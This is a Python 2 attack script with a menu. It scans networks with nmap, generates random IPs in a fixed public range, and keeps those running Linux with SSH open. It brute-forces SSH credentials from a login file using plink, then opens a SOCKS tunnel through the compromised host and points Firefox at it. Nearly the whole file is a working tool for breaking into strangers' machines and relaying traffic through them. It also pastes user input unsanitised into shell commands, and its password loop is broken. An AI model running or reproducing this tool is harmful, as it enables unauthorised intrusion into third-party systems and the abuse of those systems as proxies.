# -*- coding: utf-8 -*-
import socket
import nmap
import random
import os
import re
import subprocess
import time
from selenium import webdriver
import sys
import io

NAMES_PASSWORDS_FILE = "login.txt"
PROXY_PORT_NUMBER = 3200


def menu():
    return """1. Get IPs list.
2. Get information about a device.
3. Tunnel through device.
4. Exit.
(1/2/3/4)
"""


def get_list():
    nm = nmap.PortScanner()
    nm.scan()
    return nm.all_hosts()


def get_info():
    ip = raw_input("Insert ip: ")
    return os.system('nmap -O -Pn ' + ip)


def generate_ip():
    str_ip = "77."
    int_ip = random.randint(124, 127)
    str_ip += str(int_ip) + '.'
    int_ip = random.randint(0, 255)
    str_ip += str(int_ip) + '.'
    int_ip = random.randint(0, 255)
    str_ip += str(int_ip)
    print str_ip
    return str_ip


def check_if_up(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect_ex((ip, 22))
        sock.shutdown(2)
        result = True
    except Exception as error:
        print "an error occured: " + str(error)
        result = False
    print result
    return result


def init_tunnel():
    ans = raw_input("Generate ip [Y/N]? ")
    pat = re.compile("Linux")
    if ans.upper() == 'Y':
        ip = generate_ip()
        ops = ""
        if check_if_up(ip):
            ops = os.system('nmap -O --osscan-guess ' + ip)
        while re.search(pat, str(ops)) is None:
            ip = generate_ip()
            if check_if_up(ip):
                ops = os.system('nmap -O --osscan-guess ' + ip)
    else:
        ip = raw_input("Insert ip: ")
        ops = ""
        if check_if_up(ip):
            ops = os.system('nmap -O --osscan-guess ' + ip)
        while re.search(pat, str(ops)) is None:
            ip = raw_input("Insert another ip: ")
            if check_if_up(ip):
                ops = os.system('nmap -O --osscan-guess ' + ip)
    return ip


def handle(ans):
    if ans == 1:
        print get_list()
    if ans == 2:
        print get_info()
    if ans == 3:
        tunnel()


def check(ans):
    return ans in [1, 2, 3]


def install_firefox_proxy(proxy_host, proxy_port):
    fp = webdriver.FirefoxProfile()
    fp.set_preference("network.proxy.type", 1)
    fp.set_preference("network.proxy.socks", proxy_host)
    fp.set_preference("network.proxy.socks_port", int(proxy_port))
    fp.set_preference("network.proxy.socks_remote_dns", True)
    fp.update_preferences()
    return webdriver.Firefox(firefox_profile=fp)


def find_name_and_password(ip):
    correct = ()
    with open(NAMES_PASSWORDS_FILE, 'r') as usr_pass_file:
        usr_pass_contents = usr_pass_file.read()
        for line in usr_pass_contents:
            usr_pass = line.split(',')
            name = usr_pass[0]
            password = usr_pass[1]
            try:
                command = "plink -D %s -pw %s %s@%s" % (str(PROXY_PORT_NUMBER), password, name, ip)  # the shell command

                filename = 'output.log'
                with io.open(filename, 'wb') as writer, io.open(filename, 'rb', 1) as reader:
                    process = subprocess.Popen(command, stdout=writer,
                                               shell=True)
                    time.sleep(10)
                    process.kill()
                    while process.poll() is None:
                        sys.stdout.write(reader.read())
                        time.sleep(0.5)
                    # Read the remaining
                    sys.stdout.write(reader.read())
                with open(filename, 'rb') as my_file:
                    if "password" not in my_file.read():
                        correct = name, password

            except Exception as err:
                print "an error occured: " + str(err)
    return correct


def open_firefox():
    driver = install_firefox_proxy("127.0.0.1", PROXY_PORT_NUMBER)
    driver.get('about:config')


def tunnel_putty_link(name, password, ip):
    try:
        subprocess.call("plink -D %s -pw %s %s@%s" % (str(PROXY_PORT_NUMBER), password, name, ip))
    except Exception as error:
        print "An error occured: " + str(error)


def tunnel():
    ip = init_tunnel()
    name, password = find_name_and_password(ip)
    open_firefox()
    tunnel_putty_link(name, password, ip)


def main():
    ans = input(menu())
    while ans != 4:
        if check(ans):
            handle(ans)
        else:
            print "Invalid request"
        ans = input(menu())


if __name__ == '__main__':
    main()
